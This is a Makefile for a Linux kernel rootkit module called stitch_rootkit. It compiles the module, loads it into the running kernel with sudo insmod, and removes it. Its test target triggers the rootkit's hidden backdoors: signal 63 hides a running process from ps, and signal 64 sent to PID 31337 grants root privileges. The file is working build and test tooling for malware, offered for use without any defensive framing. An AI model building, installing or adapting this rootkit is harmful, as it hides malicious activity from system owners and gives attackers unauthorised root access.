obj-m += stitch_rootkit.o

KERNEL_DIR ?= /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KERNEL_DIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KERNEL_DIR) M=$(PWD) clean
	rm -f *.o *.ko *.mod.* *.symvers *.order

install:
	sudo insmod stitch_rootkit.ko

remove:
	sudo rmmod stitch_rootkit

test:
	# Test process hiding
	@echo "[TEST] Testing process hiding..."
	@sleep 100 & echo "Started test process with PID $$!"
	@kill -63 $$! 2>/dev/null || true
	@ps aux | grep -q "$$!" && echo "FAIL: Process still visible" || echo "PASS: Process hidden"
	
	# Test privilege escalation
	@echo "[TEST] Testing privilege escalation..."
	@id | grep -q "uid=0" && echo "Already root" || (kill -64 31337 && id)

.PHONY: all clean install remove test